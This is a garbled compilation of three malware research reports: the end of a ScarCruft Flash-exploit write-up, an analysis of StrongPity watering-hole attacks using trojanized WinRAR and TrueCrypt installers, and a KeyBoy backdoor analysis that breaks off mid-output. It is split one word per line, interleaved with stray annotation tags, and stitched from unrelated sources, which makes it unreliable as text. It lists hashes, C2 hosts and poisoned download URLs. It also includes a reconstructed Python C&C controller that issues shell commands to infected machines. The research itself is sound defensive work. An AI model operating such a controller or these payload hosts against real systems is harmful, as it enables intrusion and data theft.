Windows
DDE
interface
in
a
very
clever
way
.

First
,
they
register
a
special
window
for
it
:

In
the
window
procedure
,
they
post
WM_DDE_EXECUTE
messages
with
commands
:

Sending
WM_DDE_EXECUTE
message
to
window

The
attackers
used
the
following
commands
:

The
main
idea
here
is
that
if
you
create
a
LNK
to
an
executable
or
command
,
then
use
the
ShowGroup
method
,
the
program
will
be
executed
.

This
is
an
undocumented
behavior
in
Microsoft
Windows
.

In
our
case
,
a
malicious
VBS
was
executed
,
which
installs
a
next
stage
payload
stored
in
CAB
file
:

Malicious
VBS
used
in
the
attack

We
have
reported
this
'
creative
'
abuse
of
DDE
to
Microsoft's
security
team
.

The
final
payload
of
the
attack
is
a
CAB
file
with
the
following
MD5
:
8844a537e7f533192ca8e81886e70fbc B_hash

The
MS
CAB
file
(
md5
:
8844a537e7f533192ca8e81886e70fbc B_hash
)
contains
4
malicious
DLL
files
:

Filename
a6f14b547d9a7190a1f9f1c06f906063
cfgifut.dll
e51ce28c2e2d226365bc5315d3e5f83e
cldbct.dll
067681b79756156ba26c12bc36bf835c
cryptbase.dll
f8a2d4ddf9dc2de750c8b4b7ee45ba3f
msfte.dll

The
file
cldbct.dll
(
e51ce28c2e2d226365bc5315d3e5f83e
)
connects
to
the
following
C2
:
hXXp://webconncheck.myfw[.]us:8080/8xrss.php

The
modules
are
signed
by
an
invalid
digital
certificates
listed
as
'
Tencent
Technology
(
Shenzhen
)
Company

Limited
'
with
serial
numbers
,
copied
from
real
Tencent
certificates
:
5d
06
88
f9
04
0a
d5
22
87
fc
32
ad
ec
eb
85
b0
71
70
bd
93
cf
3f
18
9a
e6
45
2b
51
4c
49
34
0e

Invalid
digital
signature
on
malware
samples

The
malware
deployed
in
this
attack
is
extremely
rare
and
apparently
reserved
only
for
high
profile
victims
.

Our
products
detect
it
as
well
as
other
malware
from
ScarCruft B_malware.infosteal
as
HEUR:Trojan.Win32.ScarCruft.gen B_malware.infosteal
.

Victims
:

Although
our
visibility
is
rather
limited
,
some
of
the
victims
of
these
attacks
include
:

A
law
enforcement
agency
in
an
Asian
country

One
of
the
largest
trading
companies
in
Asia
and
in
the
world

A
mobile
advertising
and
app
monetization
company
in
the
USA

Individuals
related
to
the
International
Association
of
Athletics

Federations

A
restaurant
located
in
one
of
the
top
malls
in
Dubai

Some
of
these
were
compromised
over
the
last
few
days
,
indicating
the
attackers
are
still
very
active
.

Conclusions
:

Nowadays
,
in-the-wild
Flash
Player
exploits
are
becoming
rare
.

This
is
because
in
most
cases
they
need
to
be
coupled
with
a
Sandbox
bypass
exploit
,
which
makes
them
rather
tricky
.

Additionally
,
Adobe
has
been
doing
a
great
job
at
implementing
new
mitigations
to
make
exploitation
of
Flash
Player
more
and
more
difficult
.

Nevertheless
,
resourceful
threat
actors
such
as
ScarCruft B_malware.infosteal
will
probably
continue
to
deploy
zero-day B_malware.backdoor
exploits
against
their
high
profile
targets
.

As
usual
,
the
best
defense
against
targeted
attacks
is
a
multi-layered
approach
.

Windows
users
should
combine
traditional
anti-malware
technologies
with
patch
management
,
host
intrusion
detection
and
,
ideally
,
whitelisting
and
default-deny
strategies
.

According
to
a
study
by
the
Australian
DSD
,
85%
of
the
targeted
attacks
analysed
could
have
been
stopped
by
four
simple
defense
strategies
.

While
it's
impossible
to
achieve
100%
protection
,
in
practice
and
most
cases
all
you
have
to
do
is
increase
your
defenses
to
the
point
where
it
becomes
too
expensive
for
the
attacker
–
who
will
just
give
up
and
move
on
to
other
targets
.

Kaspersky
products
detect
flash
exploit
as
HEUR:Exploit.SWF.Agent.gen B_malware.infosteal
also
our
AEP
(
Automatic
Exploit

Prevention
)
component
can
successfully
detect
this
attack
.

Payloads
are
detected
with
HEUR:Trojan.Win32.ScarCruft.gen B_malware.infosteal
verdict
.

*
More
information
about
the
ScarCruft B_malware.infosteal
APT
group
is
available
to
customers
of
Kaspersky
Intelligent
Services
.

Indicators
of
compromise
:

Malicious
IPs
and
hostnames
:
212.7.217[.]10 B_ip.distribute
reg.flnet[.]org B_url.distribute
webconncheck.myfw[.]us

MD5s
:
3e5ac6bbf108feec97e1cc36560ab0b6 B_hash
a6f14b547d9a7190a1f9f1c06f906063 B_hash
e51ce28c2e2d226365bc5315d3e5f83e B_hash
067681b79756156ba26c12bc36bf835c B_hash
f8a2d4ddf9dc2de750c8b4b7ee45ba3f B_hash
8844a537e7f533192ca8e81886e70fbc B_hash
On
the
StrongPity
Waterhole B_malware.backdoor
Attacks I
Targeting
Italian
and
Belgian
Encryption
Users

securelist.com/blog/research/76147/on-the-strongpity-waterhole-attacks-targeting-italian-and-belgianencryption-users/ B_url.normal

By
Kurt
Baumgartner

Kurt
Baumgartner

Principal
Security
Researcher
,
GReAT

The
StrongPity
APT
is
a
technically
capable
group
operating
under
the
radar
for
several
years
.

The
group
has
quietly
deployed
zero-day
in
the
past
,
effectively
spearphished
targets
,
and
maintains
a
modular
toolset
.

What
is
most
interesting
about
this
group's
more
recent
activity
however
,
is
their
focus
on
users
of
encryption
tools
,
peaking
this
summer
.

In
particular
,
the
focus
was
on
Italian
and
Belgian
users
,
but
the
StrongPity
watering B_malware.backdoor
holes I
affected
systems
in
far
more
locations
than
just
those
two
.

Adding
in
their
creative
waterholing B_malware.backdoor
and
poisoned
installer
tactics
,
we
describe
the
StrongPity
APT
as
not
only
determined
and
well-resourced
,
but
fairly
reckless
and
innovative
as
well
.

Encryption
Tools

Clearly
this
APT
is
interested
in
encrypted
data
and
communications
.

The
tools
targeted
by
this
group
enable
practices
for
securing
secrecy
and
integrity
of
data
.

For
example
,
WinRAR
packs
and
encrypts
files
with
strong
suites
like
AES-256
,
and
TrueCrypt
encrypts
full
hard
drives
all
in
one
swoop
.

Both
WinRAR
and
TrueCrypt
help
provide
strong
and
reliable
encryption
.

WinRAR
enables
a
person
to
encrypt
a
file
with
AES-256
in
CBC
mode
with
a
strong
PBKDF2
HMAC-SHA256
based
key
.

And
,
TrueCrypt
provides
an
effective
open-source
full
disk
encryption
solution
for
Windows
,
Apple
,
Linux
,
and
Android
systems
.

Using
both
of
these
tools
together
,
a
sort
of
one
off
,
poor
man's
end-to-end
encryption
can
be
maintained
for
free
by
putting
these
two
solutions
together
with
free
file
sharing
services
.

Other
software
applications
help
to
support
encrypted
sessions
and
communications
.

Well
known
applications
supporting
end-to-end
encryption
are
used
by
hundreds
of
millions
of
folks
,
sometimes
unknowingly
,
every
day
.

IM
clients
like
Microsoft's
Skype
implement
256-bit
AES
encrypted
communications
,
while
Putty
,
Winscp
and
Windows
Remote
Desktop
help
provide
private
communications
and
sessions
with
fully
encrypted
communications
as
well
.

Most
of
these
communications
across
the
wire
are
currently
unbreakable
when
intercepted
,
at
least
,
when
the
applications
are
configured
properly
.

Summer
2016
Watering B_malware.backdoor
Hole I
Resources
and
Trickery
–
WinRAR
and
TrueCrypt

This
actor
set
up
a
particularly
clever
site
to
deliver
trojanized
WinRAR
installers
in
the
summer
of
2016
,
appears
to
have
compromised
another
,
and
this
activity
reminds
us
somewhat
of
the
early
2014
Crouching B_malware.drop
Yeti I
activity
.

Much
of
the
Crouching B_malware.drop
Yeti I
intrusions
were
enabled
by
trojanizing
legitimate
ICS-related
IT
software
installers
like
SCADA
environment
vpn
client
installers
and
industrial
camera
software
driver
installers
.

Then
,
they
would
compromise
the
legitimate
company
software
distribution
sites
and
replace
the
legitimate
installers
with
the
Crouching B_malware.drop
Yeti I
trojanized
versions
.

The
tactics
effectively
compromised
ICS
and
SCADA
related
facilities
and
networks
around
the
world
.

Simply
put
,
even
when
visiting
a
legitimate
company
distribution
site
,
IT
staff
was
downloading
and
installing
ICS
focused
malware
.

StrongPity's
efforts
did
much
the
same
.

1/10

In
the
case
of
StrongPity
,
the
attackers
were
not
focused
on
ICS
or
SCADA
.

They
set
up
a
domain
name
(
ralrab[.]com B_url.normal
)
mimicking
the
legitimate
WinRAR
distribution
site
(
rarlab[.]com B_url.normal
)
,
and
then
placed
links
on
a
legitimate
'
certified
distributor
'
site
in
Europe
to
redirect
to
their
poisoned
installers
hosted
on
ralrab[.]com B_url.normal
.

In
Belgium
,
the
attackers
placed
a
'
recommended
'
link
to
their
ralrab[.]com B_url.normal
site
in
the
middle
of
the
localized
WinRAR
distribution
page
on
winrar[.]be
.

The
big
blue
recommended
button
(
here
in
French
)
linked
to
the
malicious
installer
,
while
all
the
other
links
on
the
page
directed
to
legitimate
software
:

Winrar[.]be
winrar[.]be
site
with
'
recommended
link
'
leading
to
malicious
ralrab[.]com
winrar[.]be

The
winrar[.]be
winrar[.]be
site
evaluated
what
'
recommended
'
package
a
visitor
may
need
based
on
browser
localization
and
processor
capability
,
and
accordingly
offered
up
appropriate
trojanized
versions
.

Installer
resources
named
for
french
and
dutch
versions
,
along
with
32-bit
versus
64-bit
compiled
executables
were
provided
over
the
summer
:

hxxp://www.ralrab[.]com/rar/winrar-x64-531.exe

hxxp://www.ralrab[.]com/rar/winrar-x64-531fr.exe

hxxp://www.ralrab[.]com/rar/winrar-x64-531nl.exe

hxxp://www.ralrab[.]com/rar/wrar531.exe

hxxp://www.ralrab[.]com/rar/wrar531fr.exe

hxxp://www.ralrab[.]com/rar/wrar531nl.exe

hxxp://ralrab[.]com/rar/winrar-x64-531.exe

hxxp://ralrab[.]com/rar/winrar-x64-531nl.exe

hxxp://ralrab[.]com/rar/wrar531fr.exe

hxxp://ralrab[.]com/rar/wrar531nl.exe

hxxp://ralrab[.]com/rar/wrar53b5.exe

2/10

Directory
listing
,
poisoned
StrongPity
installers
,
at
rarlrab[.]com B_url.normal

The
first
available
visitor
redirects
from
winrar[.]be B_url.normal
to
ralrab[.]com B_url.normal
first
appeared
on
May
28th
,
2016
,
from
the
dutch
speaking
version
of
the
winrar.be B_url.normal
site
.

And
around
the
same
time
,
another
'
certified
distributor
'
winrar[.]it B_url.normal
served
trojanized
installers
as
well
.

The
major
difference
here
is
that
we
didn't
record
redirections
to
ralrab[.]com B_url.normal
,
but
it
appears
the
site
directly
served
StrongPity
trojanized
installers
:

hxxps://www.winrar[.]it/prelievo/WinRAR-x64-531it.exe

hxxps://www.winrar[.]it/prelievo/WRar531it.exe

The
site
started
serving
these
executables
a
couple
of
days
earlier
on
5/24
,
where
a
large
majority
of
Italian
visitors
where
affected
.

3/10

Download
page
,
winrar[.]it B_url.normal

Quite
simply
,
the
download
links
on
this
site
directed
visitors
to
trojanized
WinRAR
installers
hosted
from
the
winrar.it
site
itself
.

It's
interesting
to
note
that
both
of
the
sites
are
'
distributors
'
,
where
the
sites
are
owned
and
managed
not
by
rarlabs
,
but
by
local
owners
in
individual
countries
.

StrongPity
also
directed
specific
visitors
from
popular
,
localized
software
sharing
sites
directly
to
their
trojanized
installers
.

This
activity
continued
into
late
September
2016
.

In
particular
,
the
group
redirected
visitors
from
software
aggregation
and
sharing
site
tamindir[.]com B_url.distribute
to
their
attacker
-
controlled
site
at
true-crypt[.]com B_url.distribute
.

The
StrongPity
controlled
Truecrypt
site
is
a
complete
rip
of
the
legitimate
site
,
now
hosted
by
Sourceforge
.

Here
is
the
Tamindir
truecrypt
page
,
looks
harmless
enough
.

4/10

TrueCrypt
page
,
tamindir
software
sharing
site

Unlike
the
newer
poisoned
WinRAR
installers
,
StrongPity
hosted
several
Much
like
the
poisoned
WinRAR
installers
,
multiple
filenames
have
been
used
to
keep
up
with
visitor
interests
.
Visitors
may
have
been
directed
to
the
site
by
other
means
and
downloaded
directly
from
the
ripped
and
persuasive
site
.

5/10

true-crypt[.]com B_url.distribute
malicious
StrongPity
distribution
site

At
the
very
bottom
of
the
page
,
there
are
a
couple
of
links
to
the
poisoned
installers
:

hxxp://www.true-crypt[.]com/download/TrueCrypt-Setup-7.1a.exe

hxxp://true-crypt[.]com/files/TrueCrypt-7.2.exe

Referrers
include
these
localized
software
aggregates
and
sharers
:

gezginler[.]net/indir/truecrypt.html B_url.normal

tamindir[.]com/truecrypt/indir B_url.normal

It's
interesting
that
Ksn
recorded
appearance
of
the
the
file
on
two
unique
systems
in
December
2015
,
a
third
in
January
2016
,
all
in
Turkey
,
and
then
nothing
until
May
2016
.

Then
,
deployment
of
the
installers
continued
mostly
within
Turkey
in
July
and
September
2016
.

Summer
2016
Watering B_malware.backdoor
Hole I
Victim
Geolocations
–
WinRAR
and
TrueCrypt

6/10

Over
the
course
of
a
little
over
a
week
,
malware
delivered
from
winrar.it B_url.normal
appeared
on
over
600
systems
throughout
Europe
and
Northern
Africa
/
Middle
East
.

Likely
,
many
more
infections
actually
occurred
.

Accordingly
,
the
country
with
the
overwhelming
number
of
detections
was
in
Italy
followed
by
Belgium
and
Algeria
.

The
top
countries
with
StrongPity
malware
from
the
winrar.it B_url.normal
site
from
May
25th
through
the
first
few
days
of
June
are
Italy
,
Belgium
,
Algeria
,
Cote
D'Ivoire
,
Morroco
,
France
,
and
Tunisia
.

winrar[.]it B_url.normal
StrongPity
component
geolocation
distribution

In
a
similar
time
-
span
,
the
over
sixty
visitors
redirected
from
winrar.be B_url.normal
to
ralrab.com B_url.normal
for
malicious
file
download
were
overwhelmingly
located
in
one
country
.

The
top
countries
directed
to
StrongPity
malware
from
the
winrar.be B_url.normal
site
from
May
25th
through
the
first
few
days
of
June
are
Belgium
,
Algeria
,
Morroco
,
Netherlands
,
Canada
,
Cote
D'Ivoire
,
and
Tunisia
.

7/10

winrar[.]be B_url.normal

StrongPity
component
geolocation
distribution
StrongPity
previously
set
up
TrueCrypt
themed
watering B_malware.backdoor
holes I
in
late
2015
.

But
their
offensive
activity
surged
in
late
summer
2016
.

The
group
set
up
a
site
directly
pulled
from
the
contents
of
the
legitimate
TrueCrypt
website
.

From
mid
July
to
early
September
,
dozens
of
visitors
were
redirected
from
tamindir[.]com B_url.normal
to
true-crypt[.]com B_url.normal
with
unsurprisingly
almost
all
of
the
focus
on
systems
in
Turkey
,
with
victims
in
the
Netherlands
as
well
.

tamindir[.]com B_url.normal
to
truecrypt[.]com B_url.normal
poisoned
TrueCrypt
installer
redirects

StrongPity
Malware

The
StrongPity
droppers
were
often
signed
with
unusual
digital
certificates
,
dropping
multiple
components
that
not
only
provide
complete
control
of
the
victim
system
,
but
effectively
steal
disk
contents
,
and
can
download
components
for
further
collection
of
various
communications
and
contacts
.

Because
we
are
talking
about
StrongPity
watering B_malware.backdoor
holes I
,
let's
take
a
quick
look
at
what
is
being
delivered
by
the
group
from
these
sites
.

When
we
count
all
systems
from
2016
infected
with
any
one
of
the
StrongPity
components
or
a
dropper
,
we
see
a
more
expansive
picture
.

This
data
includes
over
1,000
systems
infected
with
a
StrongPity
component
.

The
top
five
countries
include
Italy
,
Turkey
,
Belgium
,
Algeria
,
and
France
.

8/10

In
the
case
of
the
winrar[.]be
/
ralrab[.]com
watering B_malware.backdoor
hole I
malware
,
each
one
of
the
six
droppers
that
we
observed
created
a
similar
set
of
dropped
components
on
disk
.

And
,
in
these
cases
,
the
attackers
did
not
re-use
their
fake
digital
certificates
.

In
addition
to
installing
the
legitimate
version
of
WinRAR
,
the
dropper
installed
the
following
StrongPity
components
:

%temp%\procexp.exe

%temp%\sega\

nvvscv.exe

prst.cab

prst.dll

wndplyr.exe

wrlck.cab

wrlck.dll

Of
these
files
,
two
are
configurable
and
encrypted
with
the
same
keyless
cipher
,
'
wrlck.cab
'
and
'
prst.cab
'
.

While
one
maintains
several
callback
c2
for
the
backdoor
to
fetch
more
instructions
and
upload
installed
software
and
file
paths
,
the
other
maintains
something
a
bit
more
unusual
.

'
prst.cab
'
maintains
an
encrypted
list
of
programs
that
maintain
encrypted
connections
.

This
simple
encoding
takes
the
most
significant
nibble
for
each
character
,
swaps
the
nibbles
of
that
byte
,
and
xors
the
result
against
the
original
value
.

Its
code
looks
something
like
this
:

x
=
s[i];
j
=
(
(
x
&
0xF0)>>4);
y
=
x
^
j;

Using
that
cipher
in
the
ralrab[.]com B_url.normal
malware
,
the
package
is
configured
to
seek
out
several
crypto-
enabled

9/10

software
applications
,
highlighting
the
group's
interest
in
users
of
more
encryption
-
supported
software
suites
.

putty.exe
(
a
windows
SSH
client
)

filezilla.exe
(
supports
ftps
uploads
)

winscp.exe
(
a
windows
secure
copy
application
,
providing
encrypted
and
secure
file
transfer
)

mstsc.exe
(
Windows
Remote
Desktop
client
,
providing
an
encrypted
connection
to
remote
systems
)

mRemoteNG.exe
(
a
remote
connections
manager
supporting
SSH
,
RDP
,
and
other
encrypted
protocols
)

Also
included
in
StrongPity
components
are
keyloggers
and
additional
data
stealers
.

Conclusion

Widely
available
,
strong
cryptography
software
tools
help
provide
secure
and
private
communications
that
are
now
easily
obtained
and
usable
.

In
the
summer
of
2016
,
multiple
encryption
-
enabled
software
applications
were
targeted
with
watering B_malware.backdoor
hole I
,
social
engineering
tactics
,
and
spyware
by
the
StrongPity
APT
.

While
watering B_malware.backdoor
holes I
and
poisoned
installers
are
tactics
that
have
been
effectively
used
by
other
APT
,
we
have
never
seen
the
same
focus
on
cryptographic
-
enabled
software
.

When
visiting
sites
and
downloading
encryption
-
enabled
software
,
it
has
become
necessary
to
verify
the
validity
of
the
distribution
site
and
the
integrity
of
the
downloaded
file
itself
.

Download
sites
not
using
PGP
or
strong
digital
code
signing
certificates
need
to
re-examine
the
necessity
of
doing
so
for
their
own
customers
.

We
have
seen
other
APT
such
as
Crouching B_malware.drop
Yeti I
and
Darkhotel B_malware.infosteal
distribute
poisoned
installers
and
poisoned
executable
code
,
then
redistribute
them
through
similar
tactics
and
over
p2p
networks
.

Hopefully
,
simpler
verification
systems
than
the
current
batch
of
PGP
and
SSL
applications
will
arise
to
be
adopted
in
larger
numbers
.

Until
then
,
strong
anti
-
malware
and
dynamic
whitelisting
solutions
will
be
more
necessary
than
ever
.

More
information
about
the
StrongPity
APT
group
is
available
to
customers
of
Kaspersky
Intelligent
Services
.

Contact
:
intelreports@kaspersky.com

10/10
KeyBoy B_malware.backdoor
,
Targeted
Attacks
against
Vietnam
and
India

In
our
never
-
ending
quest
to
spot
and
expose
the
nastiest
of
the
Internet
,
me
and
Mark
this
time
incidentally
stepped
into
a
targeted
attacks
campaign
apparently
directed
at
a
distributed
and
diversified
base
of
victims
.

In
this
blog
post
we'll
analyze
two
specific
incidents
apparently
targeting
victims
in
Vietnam
and
in
India
and
we'll
describe
the
capabilities
of
the
custom
backdoor
being
used
that
for
convenience
(
and
to
our
knowledge
,
for
a
lack
of
an
existing
name
)
we
call
KeyBoy B_malware.backdoor
,
due
to
a
string
present
in
one
of
the
samples
.

We'll
describe
how
the
attackers
operate
these
backdoors
,
provide
some
scripts
useful
to
further
investigate
the
campaign
as
well
as
meanings
to
detect
infections
or
scout
for
additional
samples
.

Exploits
and
Payloads

We
encountered
the
first
document
exploit
called
'
THAM
luan-
GD-
NCKH2.doc
'
a
few
days
ago
,
which
appears
to
be
leveraging
some
vulnerabilities
patched
with
MS12-060
.

When
opened
with
a
vulnerable
version
of
Microsoft
Word
,
the
exploit
will
initiate
the
infection
routine
and
display
the
legitimate
document
that
follows
:

This
document
,
written
in
Vietnamese
,
appears
to
be
reviewing
and
discussing
best
practices
for
teaching
and
researching
scientific
topics
.

We
have
no
knowledge
on
the
identity
of
the
target
,
but
we
can
assume
he
might
part
of
the
Vietnamese
academic
community
.

The
document
is
named
to
Nguyen
Anh
Tuan
,
which
is
presented
as
author
of
this
crafted
text
.

Following
are
the
hashes
of
the
exploit
file
:

THAM
luan-
GD-
NCKH2.doc

Hash

SHA1

SHA256

5ba8c42807bee050aa474fe3c876936d196c65dca9895ccd2e317133188c905e B_hash

161c840748df9b49fda878394398425a B_hash

e3cc84a4dc66e43453a039c3c983fcef92eafa7d B_hash

Value

SHA512

30bb6c3bcb797b8ebe5ab4bef59173ba358ea6713ea26cbc0147c37b99a54eca62f09475299a44c3 B_hash

98679f84fa87dc6dff084a185543945f123fb34236fa825b B_hash

When
executed
the
exploit
initially
creates
and
launches
a
dropper
at
location
%Temp%\svchost.exe
with
the
following
hashes
:

svchost.exe

Hash

SHA1

SHA256

1c076413cca929b7004863f1a3992afda665786d6e179b9886ddeb8062194049 B_hash

1f4d22e5131a66aa24f44eb0d4f1b54d B_hash

2c8a144331ec124755413f31a83e21015c74f2ec B_hash

Value

SHA512

6a73333ca96ce0db7fa62eec34987070b823d95618e9c5e36ac0486927270794790d957ebc40c513 B_hash

23941ed22acded5ecfa3e9acd88f2c66a6619fa6793231ea B_hash

This
payload
then
creates
a
DLL
file
in
system32
called
CREDRIVER.dll
,
which
is
in
fact
the
actual
backdoor
:

CREDRIVER.dll

Hash

SHA1

SHA256

ba4863d8a22864fa50a32aa85bc808371f05e8953167d34251cbd779d33e2d6d B_hash

2df60de8cb6b9fe7db1ea10581cfcda4 B_hash

fb8057595f2bb53331620c717775751df781c151 B_hash

Value

SHA512

5907c682e1cce4ce2aae3a165abefd40e7de4c4befefe895204ee59f9efd11ef75f894cd535597fe B_hash

698de80f6ee4e361234c96a0454c490b4faa69869191ed81 B_hash

We
also
identified
another
document
exploiting
CVE-2012-0158
,
but
this
time
apparently
targeting
some
Indian
individuals
.

The
content
of
the
document
is
the
following
:

This
time
the
bait
appears
to
be
related
to
the
state
of
telecommunication
infrastructure
in
the
district
of
Calcutta
in
India
,
discussing
the
coverage
of
GSM
networks
and
availability
and
stability
of
broadband
connections
.

Also
for
this
intrusion
we
can't
know
the
identity
of
the
target
,
but
our
hypothesis
is
either
someone
in
the
telecommunications
industry
or
a
representative
of
the
local
government
.

In
this
case
this
crafted
document
pretends
to
be
authored
by
someone
called
Amir
Kumar
Gupta
.

iafbsnl.doc

Hash

SHA1

SHA256

1595ea659a87677c59a195a3aeec9e3ef135c808ec353222e8eaa662117c9362 B_hash

dff54d302900e323c8988c725bbe2299 B_hash

c5c0bae48c326006b9dcc99855646d3be0b474c1 B_hash

Value

SHA512

6568f1f054c56716506ea2acdfb60919cc55f3da4ef05dee88925b6ccb835ad471e7d0d3e61befca B_hash

8b7d320c08ee7ba96322c127329c6f94bfb288eeb9c6a0c5 B_hash

CREDRIVER.dll

2b8c79678fa970ca4e229121e3de206f B_hash

5e4b7268606d6c98d00874431d39c34971149200 B_hash

Hash

SHA1

SHA256

c22792dbf9a0279b36fa22f775a92ddfea9545cc842381ba84c2402c76aa393a B_hash

SHA512

0b064bad3a237734cf74f587a573a79949c79f8922df444ac7d73474d5cab739b495036624a3b907 B_hash

Value

b18acb276ac5f8c777d4565bbba8e615212a2aedbc54f95e B_hash

All
backdoors
appear
to
be
compiled
on
April
1st
2013
,
suggesting
that
the
attacks
are
reasonably
recent
.

Analysis
of
the
Backdoor

For
the
sake
of
this
analysis
we'll
take
the
Vietnamese
backdoor
as
an
example;
the
one
found
in
the
Indian
attack
operates
in
the
exact
same
way
.

As
mentioned
,
when
the
exploit
is
opened
a
dropper
is
created
and
launched
,
which
then
takes
care
of
creating
a
Windows
service
called
MdAdum
,
which
is
then
visible
in
the
registry
as
follows
:

The
dropper
then
launches
the
service
with
the
DLL
located
at
C:\WINDOWS\system32\CREDRIVER.dll
and
deletes
itself
.

Resilience
on
the
system
is
guaranteed
by
the
use
of
such
service
which
will
be
executed
at
every
start
up
.

Note
that
the
Indian
attack
does
not
make
use
of
this
middle-stage
dropper
,
but
directly
installs
and
launches
the
Windows
service
instead
.

This
backdoor
has
several
features
including
:

1
.
Steal
credentials
from
Internet
Explorer

2
.
Steal
credentials
from
Mozilla
Firefox

3
.
Install
a
keylogger
for
intercepting
credentials
on
Google
Chrome

4
.
Operate
in
an
interactive
mode
to
allow
the
attacker
to
perform
additional
investigation
on
the
compromised
system
and
exfiltrate
data
.

Following
you
can
see
the
portion
of
the
code
where
the
backdoor
,
after
having
verified
which
version
of
Mozilla
Firefox
is
installed
on
the
system
,
decides
which
technique
to
use
to
recover
the
credentials
from
the
browser's
local
storage
.

In
older
versions
of
Firefox
,
credentials
were
stored
in
several
.txt
files
in
%AppData%\Mozilla\Firefox
,
while
in
most
recent
ones
they
are
stored
in
a
SQLite
database
.

In
the
following
snipped
you
see
the
SQL
statement
to
extract
the
data
:

Just
in
the
same
way
,
the
backdoor
attempts
to
collect
password
autocomplete
from
Internet
Explorer
:

The
backdoor
also
creates
a
separate
thread
that
installs
a
Windows
hook
procedure
on
message
WH_KEYBOARD_LL
,
through
which
it
can
intercept
keystrokes
.

We
believe
this
is
mainly
used
to
intercept
credentials
from
other
browsers
,
specifically
Google
Chrome
:

Analysis
of
the
Protocol

The
backdoor
tries
to
contact
the
following
domains
until
it
gets
a
response
from
an
active
one
:

silence.phdns01.com B_url.unknown

cpnet.phmail.us B_url.unknown

imlang.phmail.org B_url.unknown

The
Indian
backdoor
tries
to
contact
the
following
domains
instead
:

cresy.zyns.com B_url.unknown

preter.epac.to B_url.unknown

backto.ddns.name B_url.unknown

In
the
first
set
of
domains
they
are
either
registered
with
Whois
proxy
services
or
with
fake
identities
.

In
the
second
set
they
are
making
use
of
a
dynamic
DNS
service
by
ChangeIP.com B_url.normal
.

Following
are
traces
collected
from
passive
DNS
data
relevant
to
the
hosts
involved
in
these
attacks
:

Domain

First
Seen

Last
Seen

imlang.phmail.org

silence.phdns01.com B_url.unknown

May
21st
2013

May
10th
2013

May
22nd
2013

March
9th
2013

May
31st
2013

May
18th
2013

vtt.phdns01.com B_url.unknown

cpnet.phmail.us B_url.unknown

preter.epac.to B_url.unknown

preter.epac.to B_url.unknown

May
25th
2013

May
24th
2013

May
23rd
2013

April
19th
2013

May
31st
2013

May
28th
2013

199.193.66.51 B_ip.attack
(
TTL
:
1800
)

199.193.66.51 B_ip.attack
(
TTL
:
1800
)

199.193.66.51 B_ip.attack
(
TTL
:
1800
)

199.193.66.51 B_ip.attack
(
TTL
:
1800
)

1.235.10.28 B_ip.attack
(
TTL
:

113.160.44.154 B_ip.attack
(
TTL
:
30
)

6939
-
HURRICANE
-
Hurricane
Electric
,
Inc
.

6939
-
HURRICANE
-
Hurricane

Electric
,
Inc
.

6939
-
HURRICANE
-
Hurricane

Electric
,
Inc
.

6939
-
HURRICANE
-
Hurricane

Electric
,
Inc
.

9318
-
HANARO-AS
Hanaro
Telecom
Inc
.

45899
-
VNPT-AS-VN
VNPT
Corp

This
is
an
initial
request
that
the
backdoor
would
send
out
on
port
443
to
an
active
C&C
:

00000000
c4
4c
87
3f
11
1e
c4
1a
2c
a9
12
1a
19
61
82
de
|.L.?....,....a..|

00000010
19
26
f8
de
bd
26
de
19
b0
19
1a
95
a1
dd
2b
6d
|.&...&........+m|

00000020
c2
1a
82
b0
19
eb
47
b0
26
47
b0
26
20
82
eb
ca
|......G.&G.&
...|

00000030
bd
26
ca
82
54
1a
d0
c2
87
38
a1
20
82
b0
19
eb
|.&..T....8
.
....|

00000040
b0
54
b0
19
1a
00
|.T....|

At
the
time
of
the
analysis
all
the
C&C
servers
were
not
responding
,
we
started
reverse
engineering
the
communication
protocol
and
noticed
that
it
simply
used
a
multiply
with
0x69
to
encode
the
traffic
sent
to
the
controllers
.

You
can
easily
decode
the
content
of
the
payload
with
the
following
Python
snippet
:

The
previous
packet
decodes
to
the
following
:

$login$
192.168.56.101 B_ip.unknown

MyUser
2013/06/06
23:56:24

Proxy
20130401

While
reverse
engineering
the
backdoor
we
noticed
that
the
malware
expects
the
following
messages
from
the
C&C
server
it
contacts
:

Sysinfo

FileManager

Download

UploadFileOk

Shell

Intrigued
by
its
capabilities
,
we
started
reconstructing
the
communication
protocol
and
practically
building
a
tool
that
would
operate
just
like
the
original
controller
used
by
the
attackers
.

The
following
is
a
preliminary
Python
script
that
implements
the
protocol
used
by
the
malware
and
allows
you
to
interact
with
it
:

9
.
import
sys

10
.
import
socket

11
.
import
select

14
.
def
decode(x
)
:

15
.
return
'
'
.join([chr((ord(i)*0xd9)&0xff
)
for
i
in
x]
)

18
.
def
encode(x
)
:

19
.
return
'
'
.join([chr((ord(i)*0x93)&0xff
)
for
i
in
x]
)

22
.
def
main(
)
:
23
.
s
=
socket.socket(socket.AF_INET
,
socket.SOCK_STREAM
)

24
.
s.setsockopt(socket.SOL_SOCKET
,
socket.SO_REUSEADDR
,
1
)

25
.
s.bind(('0.0.0.0
'
,
443
)
)

26
.
s.listen(1
)

29
.
print
'
[*]
C&C
Running
on
0.0.0.0:443
'

32
.
while
True
:

33
.
s2
,
ca
=
s.accept(
)

34
.
print
'
[+]
New
client
connected
:
'
,
ca
36
.
while
True
:

37
.
dec
=
'
'

38
.
rlist
,
wlist
,
xlist
=
select.select([s2,],[],[]
,
10
)
39
.
while
rlist
:

40
.
data
=
s2.recv(2048
)

41
.
if
not
data
:
break

44
.
dec
=
decode(data
)
45
.
print
dec

46
.
rlist
,
wlist
,
xlist
=
select.select([s2,],[],[]
,
2
)
49
.
if
dec.startswith('$login$
'
)
:

50
.
print
'
[+]
Authenticating
on
the
bot
'

51
.
s2.send(encode('login_OK')+
'
\x00
'
)

52
.
s2.send(encode('Refresh')+
'
\x00
'
)
53
.
elif
dec.startswith('OnLine
'
)
:

54
.
s2.send(encode('test')+
'
\x00
'
)

55
.
else
:

56
.
cmd
=
raw_input('shell>
'
).strip(
)

57
.
s2.send(encode(cmd)+'\x00
'
)

60
.
s2.close(
)

63
.
s.close(
)

64
.
return
0

67
.
if
__name__
==
'
__main__
'
:

68
.
try
:
sys.exit(main(
)
)

69
.
except
KeyboardInterrupt
:
pass

We
then
launched
this
script
and
redirected
the
traffic
coming
from
a
system
infected
with
KeyBoy B_malware.backdoor
and
took
control
of
it
.

Here
you
can
see
the
bot
beaconing
in
and
requiring
for
authentication
(
funny
enough
the
password
is
'
test
'
,
while
the
Indian
sample
uses
'
dns.com B_url.normal
'
)
:

[*]
C&C
Running
on
0.0.0.0:443 B_url.cncsvr

[+]
New
client
connected
:
(
'
